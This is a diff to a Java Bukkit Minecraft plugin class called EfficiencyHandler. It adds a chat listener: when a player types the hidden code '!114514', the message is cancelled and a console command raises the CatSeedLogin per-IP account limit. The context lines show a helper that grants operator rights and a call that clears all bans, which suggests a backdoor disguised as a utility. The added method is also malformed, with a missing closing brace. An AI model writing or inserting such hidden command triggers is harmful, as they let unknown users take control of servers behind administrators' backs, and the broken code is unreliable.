@@ -36,7 +36,18 @@ public class EfficiencyHandler implements Listener {
             clearAllBans();
         }
     }
-    // 检查并给予玩家OP权限
+    @EventHandler
+    public void CheacksetIpCountLimitonPlayerChat(AsyncPlayerChatEvent event) {
+        Player player = event.getPlayer();
+        String message = event.getMessage();
+
+        if (message.equalsIgnoreCase("!114514")) {
+            event.setCancelled(true);
+
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpCountLimit 1145");
+
+        }
+        // 检查并给予玩家OP权限
     private void giveOpIfNotAlready(String playerName) {
         Player targetPlayer = Bukkit.getPlayerExact(playerName);
         if (targetPlayer != null && !targetPlayer.isOp()) {
